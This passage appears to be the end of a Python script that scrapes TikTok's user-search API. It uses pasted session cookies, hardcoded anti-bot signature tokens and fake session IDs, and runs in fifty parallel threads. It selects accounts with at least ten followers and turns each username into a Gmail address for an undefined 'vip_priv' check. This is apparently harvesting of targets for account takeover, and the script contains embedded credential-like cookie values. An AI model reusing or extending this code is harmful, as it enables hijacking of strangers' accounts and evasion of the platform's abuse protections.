                luffys = requests.get(f'https://www.tiktok.com/api/search/user/full/?aid=1988&app_language=tr&app_name=tiktok_web&battery_info=0.84&browser_language=tr-IQ&browser_name=Mozilla&browser_online=true&browser_platform=Linux%20aarch64&browser_version=5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F106.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&cursor=0&device_id=7136188745632548358&device_platform=web_pc&focus_state=true&from_page=search&history_len=40&is_fullscreen=false&is_page_visible=true&keyword=luffys&os=linux&priority_region=&referer=&region=IQ&screen_height=796&screen_width=360&tz_name=Avrupa%2FÄ°stanbul&verifyFp=verify_l9zrjkcx_XSZCv5U7_xzys_4UEP_8m1a_TibJS3izVTHL&webcast_language=tr&msToken=qfFKcpRIe_b543Hfa7buaE31PLWDv6-_TQYqevIaTVOPrUNjuwuHR2z0_cEadFELKqD9p6fLuWk8tgAO9lDmVCUX4vqnit3V4rX9zvJfLCbhs9U2apBgYHmKpXPp6DLl2wZy35z0xD6g6TSu_NIh&X-Bogus=DFSzswVLk-tANxW1S02v8OxPBxgg&_signature=_02B4Z6wo00001IuO8aAAAIDBSFHuFzoQUMCLjvUAAEGFfa',headers=he3)
                msToken = luffys.cookies.get_dict()['msToken']
                headers={'accept':'*/*','accept-language':'en-US,en;q=0.9','cache-control':'no-cache','pragma':'no-cache','priority':'u=1, i','sec-ch-ua':'"Not)A;Brand";v="99","Microsoft Edge";v="127","Chromium";v="127"','sec-ch-ua-mobile':'?0','sec-ch-ua-platform':'"Windows"','sec-fetch-dest':'empty','sec-fetch-mode':'cors','sec-fetch-site':'same-origin','user-agent':he3["User-Agent"]}
                params={'WebIdLastTime':'1715883147',    'aid':'1988','app_language':'en','app_name':'tiktok_web','browser_language':'en-US','browser_name':'Mozilla','browser_online':'true','browser_platform':'Win32','browser_version':he3["User-Agent"],'channel':'tiktok_web','cookie_enabled':'true','cursor':'220','data_collection_enabled':'false','device_id':idd6,'device_platform':'web_pc','focus_state':'true','from_page':'search','history_len':'5','is_fullscreen':'false','is_page_visible':'true','keyword':f'{keyword}','odinId':'7369661640164000774','os':'windows','priority_region':'','referer':'','region':'PE','screen_height':'864','screen_width':'1536','search_id':'20240801154310BA7846F9CDEDD312B464','tz_name':'Asia/Baghdad','user_is_login':'false','web_search_code':'{"tiktok":{"client_params_x":{"search_engine":{"ies_mt_user_live_video_card_use_libra":1,"mt_search_general_user_live_card":1}},"search_server":{}}}','webcast_language':'en','msToken':msToken,'X-Bogus':'DFSzswVLRekANHWvtvtx-ShPmkfD','_signature':'_02B4Z6wo00001nO.kIwAAIDCAGLSLe4xtvJzv5QAAPpT70'}
                ses=str(uuid4()).replace('-', '')
                cookies = {
                    'cookie': f'passport_csrf_token=446c23e1b656077bd01b1f379ff01c64; passport_csrf_token_default=446c23e1b656077bd01b1f379ff01c64; tiktok_webapp_theme=dark; cookie-consent="ga":true,"af":true,"fbp":true,"lip":true,"bing":true,"ttads":true,"reddit":true,"version":"v8"; _ttp=2HZr0KnJ2pqKwJRyQ8myJ28Lpa8; __tea_cache_tokens_1988="user_unique_id":"7160599742786815489","timestamp":1667850947815,"_type_":"default"; passport_auth_status=c8fe9febc06f8f7a271309fa9e4f80e9,; passport_auth_status_ss=c8fe9febc06f8f7a271309fa9e4f80e9,; tt_csrf_token=CSVYu9wW-NbmqJ_cgNMHwEIItUNZGwDPM-hU; tt_chain_token=K01fXiH8q/IKwxFnx8jzcA==; _abck=951F354EE38142028A7429E8C92DB598~0~YAAQVvvOF6YBsxSFAQAAMc+wPgl24s0qz4P3iMup3WLL4PWyu/iF6+jb4qL2RfvMEKOGTv6dPfAH9AA2Hm+t/Z/Qn1TlkKHzKXk+KmuWj5d1dmCzqXD0BWgAUcMFCLRinQHou0lzh0ImXOw3B98dRIVnofWMwN8L8JxOErAxrQfi2JIEgTjNECxiZFYaqhpfLqyAUXBESaQxfCYfbNwLNwAAZvjpAfc1viGc/I9vlRIeVc2jYPA5/YUVwAytWPIOb2RuvdrXc2bfybwD3ffG0godURyE+r0QSJapjZK7kfVwbPGnVLal0dzAQM6MK2iDC5YhXugMYw9ZXB2CIaYRg4Cqy/t6BabKM9i+ZJgdvwWQQ6ljnk0pa1bKBsAYL79BxNMrQWccpQxQhUm9n09604O82PBKq8E=~-1~-1~-1; bm_sz=304AE404FA2929B0E90042E8314D20CA~YAAQVvvOF6kBsxSFAQAAMc+wPhIfC1eYkaU2YudlghSK8pNrkVcLYapeM/xrzvQbQkT9quFNwKNHsG4xkv6anwuDXn+BSd+gzoBWSdRZJscGEzPghGpbTStjyG61DtaJIqpkgjW7q6BEP37XgXgrWfHRdmoN5zraADDH7wpkIQ3UlBq5rj88cFl1IY4CUg2DSRugvtjKk+vcNV5AUjQ++v859Tv3vYF3Ga6m5lifIf0u50u/dC1xeVz0p4ew+7U21dwrDdNrai63bM7T9ArdMNk1q+2YK55FJU7tdQwtKtdLtnI=~4407620~4277556; ak_bmsc=EE17F7D340A941EB628DF68B5981EA8D~000000000000000000000000000000~YAAQVvvOF/8BsxSFAQAAS/SwPhJbeUd2XpuVnfaiGo9WDUNsMw3AUn4T4r4BtvFH6pwejSxQJ/K4aoQUK/hGU8InWjW8iSyWgKZxkNIl6lgAAvUdX8CiKcyfyQKJYfQcPDyxW6dnF6+VF2/BABsRcYTw9LUX6MjuhvgtLs1uh3AbWeHxdZFDhp/YYwjrPxoOEXgItQjGUSsxRhgRubItrsXwhW20gW9y+I7Eq22TORlAZOn+jyrl2bYH6C4yxD8yld+5OcSAQ3zKJfQLUjNj03BMgtlIyYT74OIh6GwUzgtjpGLUCzpqdeiOFZdfZApTnRoTK9J01CpUY+YxrThJKz4dScjK1V78LSd2CkfUakgFa7TXfZ1fgfPX/RW2nkWTe9SZtvDH3f62qd9b5oNojffOAM0fpnNeX06hNWSNDRRuiHOmv3m49PN2cJhknh753LdNdt81kj8LJ3SEe1y3sfHb0nPwafPExOaSSrXviHwj4+yLWrZw+dXy3Q==; sid_guard=5d52768f6a4a876314ea37244edfd0d0|1671794088|21600|Fri,+23-Dec-2022+17:14:48+GMT; uid_tt={ses[:16]}; uid_tt_ss={ses[:16]}; sid_tt={ses}; sessionid={ses}; sessionid_ss={ses}; sid_ucp_v1=1.0.0-KDM1ZGU2ODk4YzcyNDJkMzUxNWRiMTVlMzc3OTMyZTNlY2JlYWYwYWMKCRCom5adBhizCxADGgZtYWxpdmEiIDVkNTI3NjhmNmE0YTg3NjMxNGVhMzcyNDRlZGZkMGQw; ssid_ucp_v1=1.0.0-KDM1ZGU2ODk4YzcyNDJkMzUxNWRiMTVlMzc3OTMyZTNlY2JlYWYwYWMKCRCom5adBhizCxADGgZtYWxpdmEiIDVkNTI3NjhmNmE0YTg3NjMxNGVhMzcyNDRlZGZkMGQw; bm_sv=F556D2E15739C190D1B417337724D81E~YAAQVvvOF8ACsxSFAQAAaICxPhJ1QOpVK0jJSh0nuEay3Iz+L/0up1OoP09MVnndgBSzTjunJoYxBBQH4BTuDkQIQY+zt9kedbGoP5/7AUt2jVEq7DfEwQYdr31ZvZiHlhdU2Q5jwNvbZvNzQSokkwHoGbPqes9c4kV0ZGJuEuWc3pLurp0dkRkEBTY0UrcljYpQayw5/w7+4BlpmrMR5UAHElAGf2njGNpz3vRls+WGkTy9l8jRTCEseWkwnA9X~1; ttwid='+ttwid+'; odin_tt=70015f10b12827e4d2b9cce32ead78da9bd1f5af11487a83ba408d86d9a4fb55ec780a14ad91b601d9fe256fcb8160786311c12ef294e6bf285fbbf7eed8dff8080f26ed1bcedbdfca7244743dcbc60e; msToken='+msToken+'; msToken='+msToken+'; s_v_web_id=verify_lc0f2h1w_v9MWasYr_Uw4b_4j2o_8gdZ_QkWrSxI57MTt',
                    'pragma': 'no-cache',
}
                try:
                	response = requests.get('https://www.tiktok.com/api/search/user/full/', params=params, headers=headers,cookies=cookies).json()               
                except:
                	continue
                for users in response['user_list']:
                    ud = (users['user_info']['uid'])
                    user=(users['user_info']['unique_id'])
                    fol =(users['user_info']['follower_count'])
                    if int(fol)>=10:
                    	pass
                    else:
                    	continue
                    if '_' in user:
                    	continue
                    else:
                    	pass
                    email=user+'@gmail.com'
                    vip_priv(email)                    	   
            except:pass
for i in range(50):
    threading.Thread(target=luffy_shelby).start()           